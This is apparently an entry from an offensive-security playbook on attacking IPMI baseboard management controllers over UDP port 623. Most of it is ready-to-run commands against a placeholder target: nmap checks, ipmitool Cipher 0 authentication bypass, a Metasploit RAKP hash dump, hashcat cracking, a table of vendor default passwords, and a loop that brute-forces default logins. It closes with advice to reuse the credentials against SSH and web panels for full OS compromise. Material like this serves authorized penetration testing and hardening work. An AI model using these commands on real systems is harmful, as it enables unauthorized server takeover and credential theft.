---
id: ipmi-enum
title: IPMI Enumeration
stage: enumeration
tags: [linux, windows]
summary: Exploit IPMI 2.0 to dump password hashes via RAKP authentication or bypass auth entirely with Cipher 0 — cracked hashes are frequently reused for SSH and web admin panels.
leads_to:
  - password-spray
  - ssh-access
---

## Prerequisites

Port 623 UDP open — won't appear in TCP scans. Common on servers with out-of-band management (Dell iDRAC, HP iLO, Supermicro BMC).

IPMI (Intelligent Platform Management Interface) provides out-of-band server management and is often overlooked. The IPMI 2.0 RAKP protocol design flaw means any client can request a password hash from the BMC without authenticating — the hash is then crackable offline. Cipher Suite 0 is an even worse bug: it authenticates with any password, including blank.

## Quick Win

> Detect IPMI and check for Cipher 0 — bypass auth before trying to crack hashes.

```bash
nmap -sU -p623 --script ipmi-version $TARGET
nmap -sU -p623 --script ipmi-cipher-zero $TARGET
```

## Cipher Zero Authentication Bypass

> If vulnerable, any password (including blank) authenticates — instant access.

```bash
ipmitool -I lanplus -C 0 -H $TARGET -U admin -P anything chassis status
ipmitool -I lanplus -C 0 -H $TARGET -U ADMIN -P '' user list
```

## Hash Dumping (Metasploit)

> RAKP protocol sends a salted SHA1/MD5 hash of the password to any requester.

```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $TARGET
set OUTPUTFILE /tmp/ipmi_hashes.txt
run
```

## Crack Hashes

> Mode 7300 for IPMI RAKP — rockyou cracks most default vendor passwords quickly.

```bash
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Default Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | (random, on chassis label) |
| Supermicro | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |

```bash
for user in admin ADMIN root administrator; do
  for pass in admin ADMIN calvin PASSW0RD ''; do
    ipmitool -I lanplus -H $TARGET -U $user -P $pass chassis status 2>/dev/null && echo "HIT: $user:$pass"
  done
done
```

## Leads To

Cracked or default IPMI credentials → try immediately against SSH, web admin panels, and the iDRAC/iLO web UI (password-spray). BMC access with valid creds → power cycle, virtual media mount, console access → full OS compromise. Credentials often reused at the OS level — check SSH first.
